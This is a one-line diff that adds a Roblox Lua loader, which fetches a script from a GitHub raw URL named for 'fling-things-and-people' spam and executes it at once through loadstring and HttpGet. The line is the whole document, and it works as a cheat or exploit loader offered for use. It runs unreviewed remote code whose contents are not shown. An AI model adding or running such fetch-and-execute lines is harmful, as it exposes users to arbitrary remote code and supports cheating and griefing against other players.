@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/fling-things-and-people-spam6-kvwgmggykb9c0b.lua"))()
